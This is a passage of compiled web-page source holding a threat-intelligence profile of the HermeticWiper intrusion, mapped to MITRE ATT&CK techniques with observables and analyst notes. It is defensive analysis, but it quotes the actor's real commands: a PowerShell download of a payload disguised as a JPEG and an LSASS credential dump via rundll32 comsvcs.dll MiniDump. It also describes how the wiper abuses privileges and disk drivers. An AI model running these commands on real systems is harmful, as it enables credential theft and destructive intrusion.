target process is provided as argument; in this case is pId = 600.",(0,i.kt)("br",null),"- Using ",(0,i.kt)("em",{parentName:"td"},"comsvcs.dll MimiDump")," for creating LSASS process memory dumps is a known trick.")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,i.kt)("td",{parentName:"tr",align:null},"T1553.002"),(0,i.kt)("td",{parentName:"tr",align:null},"HermeticWiper used ",(0,i.kt)("em",{parentName:"td"},"valid digital signatures")," to undermine security controls for Defense Evasion."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"File Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"*\\\\#{binaryName}.exe")),(0,i.kt)("td",{parentName:"tr",align:null},"- Code signing provides a level of authenticity on a binary from the developer.")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,i.kt)("td",{parentName:"tr",align:null},"T1140"),(0,i.kt)("td",{parentName:"tr",align:null},"HermeticWiper used ",(0,i.kt)("em",{parentName:"td"},"embedded resources")," to stage ",(0,i.kt)("em",{parentName:"td"},"EaseUS Partition Master")," drivers for Defense Evasion."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"File Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\drivers\\\\fndr.sys"),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\drivers\\\\njdr.sys")),(0,i.kt)("td",{parentName:"tr",align:null},"- 4 versions of the drivers are included in the resources.",(0,i.kt)("br",null),"- The drivers are compressed using the ",(0,i.kt)("em",{parentName:"td"},"MSLZ")," format.",(0,i.kt)("br",null),"- Only one driver is written to disk with partially randomized file name.",(0,i.kt)("br",null),'- File name follows the pattern: "',"[a-z]",'{2}dr.sys"')),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Execution"),(0,i.kt)("td",{parentName:"tr",align:null},"T1106",(0,i.kt)("br",null),"T1543",(0,i.kt)("br",null),"T1569.002",(0,i.kt)("br",null),"T1112"),(0,i.kt)("td",{parentName:"tr",align:null},"HermeticWiper used ",(0,i.kt)("em",{parentName:"td"},"Native APIs")," to execute the drivers as a ",(0,i.kt)("em",{parentName:"td"},"Windows Service")," for Execution."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"RegValue Created"),": ",(0,i.kt)("inlineCode",{parentName:"td"},"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\#[a-z]{2}dr")),(0,i.kt)("td",{parentName:"tr",align:null})),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Privilege Escalation"),(0,i.kt)("td",{parentName:"tr",align:null},"T1106",(0,i.kt)("br",null),"T1134"),(0,i.kt)("td",{parentName:"tr",align:null},"HermeticWiper used ",(0,i.kt)("em",{parentName:"td"},"AdjustTokenPrivileges")," Native API to give itself ",(0,i.kt)("em",{parentName:"td"},"SeLoadDriverPrivilege"),", ",(0,i.kt)("em",{parentName:"td"},"SeShutDownPrivilege")," and ",(0,i.kt)("em",{parentName:"td"},"SeBackupPrivilege")," privileges for Privilege Escalation."),(0,i.kt)("td",{parentName:"tr",align:null}),(0,i.kt)("td",{parentName:"tr",align:null},"- An access token is a type of object that describes the security context of a process or thread, and is assigned to all processes created in the system.",(0,i.kt)("br",null),"- ",(0,i.kt)("em",{parentName:"td"},"SeLoadDriverPrivilege"),": Allows to Load and unload device drivers. The activation of this policy in the context of non-privileged users implies a significant risk due to the possibility of executing code in kernel space.",(0,i.kt)("br",null),"- ",(0,i.kt)("em",{parentName:"td"},"SeShutDownPrivilege"),": Allows to shutdown local system. Ransomware and wipers might rely on this for larger impact.",(0,i.kt)("br",null),"- ",(0,i.kt)("em",{parentName:"td"},"SeBackupPrivilege"),": Allows to read files even when such right is not specified on the Access Control List. Ransomware and wipers might rely on this for larger impact.",(0,i.kt)("br",null),"- ",(0,i.kt)("a",{parentName:"td",href:"https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/"},"https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/"),(0,i.kt)("br",null),"- ",(0,i.kt)("a",{parentName:"td",href:"https://grzegorztworek.medium.com/ive-got-the-power-4f44b1998c88"},"https://grzegorztworek.medium.com/ive-got-the-power-4f44b1998c88"))),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Impact"),(0,i.kt)("td",{parentName:"tr",align:null},"T1106",(0,i.kt)("br",null),"T1490"),(0,i.kt)("td",{parentName:"tr",align:null},"HermeticWiper used ",(0,i.kt)("em",{parentName:"td"},"Native APIs")," to stop the Volume Shadow Copy Service for Impact."),(0,i.kt)("td",{parentName:"tr",align:null}),(0,i.kt)("td",{parentName:"tr",align:null},"- The VSS service creates incremental back-ups over time. It's is often disabled by ransomware and wipers.",(0,i.kt)("br",null),"- An alternative method is to use ",(0,i.kt)("em",{parentName:"td"},"SC.EXE")," to disable VSS service.")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Impact"),(0,i.kt)("td",{parentName:"tr",align:null},"T1561.002",(0,i.kt)("br",null),"T1561.001"),(0,i.kt)("td",{parentName:"tr",align:null},"HermeticWiper used ",(0,i.kt)("em",{parentName:"td"},"EaseUS Partition Master")," drivers for direct access to storage devices to overwrite files for Impact."),(0,i.kt)("td",{parentName:"tr",align:null}),(0,i.kt)("td",{parentName:"tr",align:null},"- MBR (Master Boot Record) is located on first 512 bytes each drive.",(0,i.kt)("br",null),"- Target folders: C:\\Documents and Settings\\, C:\\System Volume Information\\, C:\\Windows\\SYSVOL\\, C:\\Windows\\System32\\winevt\\Logs, C:\\Windows\\System32\\winevt\\Logs")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Impact"),(0,i.kt)("td",{parentName:"tr",align:null},"T1106",(0,i.kt)("br",null),"T1529"),(0,i.kt)("td",{parentName:"tr",align:null},"HermeticWiper used ",(0,i.kt)("em",{parentName:"td"},"InitiateSystemShutdownEx")," Native API to shutdown the system for Impact."),(0,i.kt)("td",{parentName:"tr",align:null}),(0,i.kt)("td",{parentName:"tr",align:null},"- This API requires ",(0,i.kt)("em",{parentName:"td"},"SeShutDownPrivilege")," privilege.")))),(0,i.kt)("h2",{id:"ttp-profiles-with-observables"},"TTP Profiles with Observables"),(0,i.kt)("h3",{id:"threat-actor-used-likely-wmi-and-impacket-to-execute-cmd-commands-on-victim-endpoints-for-command-and-control"},"Threat Actor used likely ",(0,i.kt)("em",{parentName:"h3"},"WMI")," and ",(0,i.kt)("em",{parentName:"h3"},"Impacket")," to execute ",(0,i.kt)("em",{parentName:"h3"},"CMD")," commands on victim endpoints for Command And Control."),(0,i.kt)("h4",{id:"tactic"},"Tactic"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Command And Control")),(0,i.kt)("h4",{id:"techniques"},"Techniques"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"T1047 - Windows Management Instrumentation"),(0,i.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,i.kt)("h4",{id:"behaviors-and-observables"},"Behaviors and Observables"),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1047",(0,i.kt)("br",null),"T1059.003"),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"CMD")," executions with command-line patterns similar to ",(0,i.kt)("em",{parentName:"td"},"Impacket"),"."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"cmd.exe /Q /c powershell -c \\\"(New-Object System.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL_SYSTEM_DRIVE\\\\temp\\\\sys.tmp1')\\\"> \\\\\\\\127.0.0.1\\\\ADMIN$\\__[TIMESTAMP] 2>&1"),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\\\temp\\\\sys.tmp1 CSIDL_WINDOWS\\\\policydefinitions\\\\postgresql.exe 1> \\\\\\\\127.0.0.1\\\\ADMIN$\\\\__1636727589.6007507 2>&1"),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'cmd.exe /Q /c powershell -c \\"rundll32 C:\\\\windows\\\\system32\\\\comsvcs.dll MiniDump 600 C:\\\\asm\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\winupd.log full\\" 1> \\\\127.0.0.1\\ADMIN$\\__1638457529.1247072 2>&1'))))),(0,i.kt)("h4",{id:"notes"},"Notes"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Patterns in the command-line arguments is consistent with Impackets ",(0,i.kt)("em",{parentName:"li"},"wmiexec.py")," script."),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("em",{parentName:"li"},"Impacket")," is an open source collection of modules written in Python for programmatically constructing and manipulating network protocols."),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("em",{parentName:"li"},"Impacket")," contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks."),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py"},"https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py"))),(0,i.kt)("h3",{id:"threat-actor-used-powershell-to-download-malware-masqueraded-as-jpeg-file-from-internal-server-for-lateral-movement"},"Threat Actor used ",(0,i.kt)("em",{parentName:"h3"},"PowerShell")," to download malware masqueraded as ",(0,i.kt)("em",{parentName:"h3"},".jpeg")," file from ",(0,i.kt)("em",{parentName:"h3"},"internal server")," for Lateral Movement."),(0,i.kt)("h4",{id:"tactic-1"},"Tactic"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Lateral Movement")),(0,i.kt)("h4",{id:"techniques-1"},"Techniques"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"T1570 - Lateral Tool Transfer"),(0,i.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell")),(0,i.kt)("h4",{id:"behaviors-and-observables-1"},"Behaviors and Observables"),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1570",(0,i.kt)("br",null),"T1059.001"),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"PowerShell")," downloaded file from ",(0,i.kt)("em",{parentName:"td"},"internal server")," to ",(0,i.kt)("em",{parentName:"td"},"Temp")," folder."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"powershell -c \\\"(New-Object System.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL_SYSTEM_DRIVE\\\\temp\\\\sys.tmp1')\\\"> \\\\\\\\127.0.0.1\\\\ADMIN$\\__[TIMESTAMP] 2>&1"))))),(0,i.kt)("h4",{id:"notes-1"},"Notes"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},'"CSIDL_SYSTEM_DRIVE" is not on the list of recognized environment variables.'),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://docs.microsoft.com/en-us/windows/deployment/usmt/usmt-recognized-environment-variables"},"https://docs.microsoft.com/en-us/windows/deployment/usmt/usmt-recognized-environment-variables"))),(0,i.kt)("h3",{id:"threat-actor-used-schtasks-to-periodically-create-malicious-file-at-windows-policy-definition-folder-for-persistence"},"Threat Actor used ",(0,i.kt)("em",{parentName:"h3"},"SCHTASKS")," to periodically create malicious file at Windows Policy Definition folder for Persistence."),(0,i.kt)("h4",{id:"tactic-2"},"Tactic"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Persistence")),(0,i.kt)("h4",{id:"techniques-2"},"Techniques"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"T1053.005 - Scheduled Task/Job: Scheduled Task"),(0,i.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,i.kt)("h4",{id:"behaviors-and-observables-2"},"Behaviors and Observables"),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1053.005"),(0,i.kt)("td",{parentName:"tr",align:null},"Scheduled Task executed."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'schtasks /run /tn \\"\\\\Microsoft\\\\Windows\\\\termsrv\\\\licensing\\\\TlsAccess\\"'))),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1059.003",(0,i.kt)("br",null),"T1053.005"),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"CMD move")," file from ",(0,i.kt)("em",{parentName:"td"},"Temp")," folder to Windows Policy Definition folder."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\\\temp\\\\sys.tmp1 CSIDL_WINDOWS\\\\policydefinitions\\\\postgresql.exe 1> \\\\\\\\127.0.0.1\\\\ADMIN$\\\\__1636727589.6007507 2>&1"))))),(0,i.kt)("h3",{id:"threat-actor-used-certutil-to-check-internet-connectivity-for-discovery"},"Threat Actor used ",(0,i.kt)("em",{parentName:"h3"},"CERTUTIL")," to check internet connectivity for Discovery."),(0,i.kt)("h4",{id:"tactic-3"},"Tactic"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Discovery")),(0,i.kt)("h4",{id:"techniques-3"},"Techniques"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols")),(0,i.kt)("h4",{id:"behaviors-and-observables-3"},"Behaviors and Observables"),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,i.kt)("td",{parentName:"tr",align:null},"CERTUTIL performed network connections."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,i.kt)("inlineCode",{parentName:"td"},"trustsecpro[.]com"),(0,i.kt)("br",null),(0,i.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,i.kt)("inlineCode",{parentName:"td"},"whatismyip[.]com"))))),(0,i.kt)("h3",{id:"threat-actor-used-powershell-to-download-additional-malware-masqueraded-as-jpeg-file-from-external-server-for-command-and-control"},"Threat Actor used ",(0,i.kt)("em",{parentName:"h3"},"PowerShell")," to download additional malware masqueraded as ",(0,i.kt)("em",{parentName:"h3"},"jpeg")," file from external server for Command And Control."),(0,i.kt)("h4",{id:"tactic-4"},"Tactic"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Command And Control")),(0,i.kt)("h4",{id:"techniques-4"},"Techniques"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols")),(0,i.kt)("h4",{id:"behaviors-and-observables-4"},"Behaviors and Observables"),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"PowerShell")," performed network connections."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,i.kt)("inlineCode",{parentName:"td"},"confluence.novus[.]ua"))))),(0,i.kt)("h3",{id:"threat-actor-used-com-service-dll-to-dump-lsass-process-memory-via-rundll32-and-powershell-for-credential-access"},"Threat Actor used ",(0,i.kt)("em",{parentName:"h3"},"COM+ Service DLL")," to dump ",(0,i.kt)("em",{parentName:"h3"},"LSASS")," process memory via ",(0,i.kt)("em",{parentName:"h3"},"RunDll32")," and ",(0,i.kt)("em",{parentName:"h3"},"PowerShell")," for Credential Access."),(0,i.kt)("h4",{id:"tactic-5"},"Tactic"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Credential Access")),(0,i.kt)("h4",{id:"techniques-5"},"Techniques"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,i.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,i.kt)("li",{parentName:"ul"},"T1218.011 - Signed Binary Proxy Execution: Rundll32"),(0,i.kt)("li",{parentName:"ul"},"T1003.001 - OS Credential Dumping: LSASS Memory")),(0,i.kt)("h4",{id:"behaviors-and-observables-5"},"Behaviors and Observables"),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"CMD")," executions with ",(0,i.kt)("em",{parentName:"td"},"Impacket")," patterns in command-line."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'cmd.exe /Q /c powershell -c \\"rundll32 C:\\\\windows\\\\system32\\\\comsvcs.dll MiniDump 600 C:\\\\asm\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\winupd.log full\\" 1> \\\\127.0.0.1\\ADMIN$\\__1638457529.1247072 2>&1'))),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1059.001",(0,i.kt)("br",null),"T1218.011"),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"PowerShell")," launched ",(0,i.kt)("em",{parentName:"td"},"RunDll32"),"."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'powershell -c \\"rundll32 C:\\\\windows\\\\system32\\\\comsvcs.dll MiniDump 600 C:\\\\asm\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\winupd.log full\\"'))),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1003.001",(0,i.kt)("br",null),"T1059.001",(0,i.kt)("br",null),"T1218.011"),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"RunDll32")," launched ",(0,i.kt)("em",{parentName:"td"},"COM+ Services DLL")," (comsvcs.dll) to create a process memory dump."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"rundll32 C:\\\\windows\\\\system32\\\\comsvcs.dll MiniDump 600 C:\\\\asm\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\winupd.log full"))))),(0,i.kt)("h4",{id:"notes-2"},"Notes"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("em",{parentName:"li"},"comsvcs.dll")," is the ",(0,i.kt)("em",{parentName:"li"},"COM+ Service DLL")," in Windows."),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("em",{parentName:"li"},"comsvcs.dll MimiDump")," method is used to create processes memory dumps."),(0,i.kt)("li",{parentName:"ul"},"The target process is provided as argument; in this case is pId = 600."),(0,i.kt)("li",{parentName:"ul"},"Using ",(0,i.kt)("em",{parentName:"li"},"comsvcs.dll MimiDump")," for creating LSASS process memory dumps is a known trick.")),(0,i.kt)("h3",{id:"hermeticwiper-used-valid-digital-signatures-to-undermine-security-controls-for-defense-evasion"},"HermeticWiper used ",(0,i.kt)("em",{parentName:"h3"},"valid digital signatures")," to undermine security controls for Defense Evasion."),(0,i.kt)("h4",{id:"tactic-6"},"Tactic"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,i.kt)("h4",{id:"techniques-6"},"Techniques"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"T1553.002 - Subvert Trust Controls: Code Signing")),(0,i.kt)("h4",{id:"behaviors-and-observables-6"},"Behaviors and Observables"),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1553.002"),(0,i.kt)("td",{parentName:"tr",align:null},"Malware was signed with valid Certificate."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"File Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"*\\\\#{binaryName}.exe"))))),(0,i.kt)("h4",{id:"notes-3"},"Notes"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Code signing provides a level of authenticity on a binary from the developer.")),(0,i.kt)("h3",{id:"hermeticwiper-used-embedded-resources-to-stage-easeus-partition-master-drivers-for-defense-evasion"},"HermeticWiper used ",(0,i.kt)("em",{parentName:"h3"},"embedded resources")," to stage ",(0,i.kt)("em",{parentName:"h3"},"EaseUS Partition Master")," drivers for Defense Evasion."),(0,i.kt)("h4",{id:"tactic-7"},"Tactic"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,i.kt)("h4",{id:"techniques-7"},"Techniques"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"T1140 - Deobfuscate/Decode Files or Information")),(0,i.kt)("h4",{id:"behaviors-and-observables-7"},"Behaviors and Observables"),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1140"),(0,i.kt)("td",{parentName:"tr",align:null},"Files created at ",(0,i.kt)("em",{parentName:"td"},"Windows Driver")," folder with partially randomized file names."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"File Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\drivers\\\\fndr.sys"),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\drivers\\\\njdr.sys"))))),(0,i.kt)("h4",{id:"notes-4"},"Notes"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"4 versions of the drivers are included in the resources."),(0,i.kt)("li",{parentName:"ul"},"The drivers are compressed using the ",(0,i.kt)("em",{parentName:"li"},"MSLZ")," format."),(0,i.kt)("li",{parentName:"ul"},"Only one driver is written to disk with partially randomized file name."),(0,i.kt)("li",{parentName:"ul"},'File name follows the pattern: "',"[a-z]",'{2}dr.sys"')),(0,i.kt)("h3",{id:"hermeticwiper-used-native-apis-to-execute-the-drivers-as-a-windows-service-for-execution"},"HermeticWiper used ",(0,i.kt)("em",{parentName:"h3"},"Native APIs")," to execute the drivers as a ",(0,i.kt)("em",{parentName:"h3"},"Windows Service")," for Execution."),(0,i.kt)("h4",{id:"tactic-8"},"Tactic"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Execution")),(0,i.kt)("h4",{id:"techniques-8"},"Techniques"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"T1106 - Native API"),(0,i.kt)("li",{parentName:"ul"},"T1543 - Create or Modify System Process: Windows Service"),(0,i.kt)("li",{parentName:"ul"},"T1569.002 - System Services: Service Execution"),(0,i.kt)("li",{parentName:"ul"},"T1112 - Modify Registry")),(0,i.kt)("h4",{id:"behaviors-and-observables-8"},"Behaviors and Observables"),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1106",(0,i.kt)("br",null),"T1543",(0,i.kt)("br",null),"T1569.002"),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Native APIs")," calls (",(0,i.kt)("em",{parentName:"td"},"OpenSCManagerW"),", ",(0,i.kt)("em",{parentName:"td"},"OpenServiceW"),", ",(0,i.kt)("em",{parentName:"td"},"CreateServiceW")," and ",(0,i.kt)("em",{parentName:"td"},"StartServiceW"),") to create a ",(0,i.kt)("em",{parentName:"td"},"Windows Service"),"."),(0,i.kt)("td",{parentName:"tr",align:null})),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1112",(0,i.kt)("br",null),"T1543"),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Windows Registry")," modification for new service."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"RegValue Created"),": ",(0,i.kt)("inlineCode",{parentName:"td"},"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\#[a-z]{2}dr"))))),(0,i.kt)("h3",{id:"hermeticwiper-used-adjusttokenprivileges-native-api-to-give-itself-seloaddriverprivilege-seshutdownprivilege-and-sebackupprivilege-privileges-for-privilege-escalation"},"HermeticWiper used ",(0,i.kt)("em",{parentName:"h3"},"AdjustTokenPrivileges")," Native API to give itself ",(0,i.kt)("em",{parentName:"h3"},"SeLoadDriverPrivilege"),", ",(0,i.kt)("em",{parentName:"h3"},"SeShutDownPrivilege")," and ",(0,i.kt)("em",{parentName:"h3"},"SeBackupPrivilege")," privileges for Privilege Escalation."),(0,i.kt)("h4",{id:"tactic-9"},"Tactic"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Privilege Escalation")),(0,i.kt)("h4",{id:"techniques-9"},"Techniques"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"T1106 - Native API"),(0,i.kt)("li",{parentName:"ul"},"T1134 - Access Token Manipulation")),(0,i.kt)("h4",{id:"behaviors-and-observables-9"},"Behaviors and 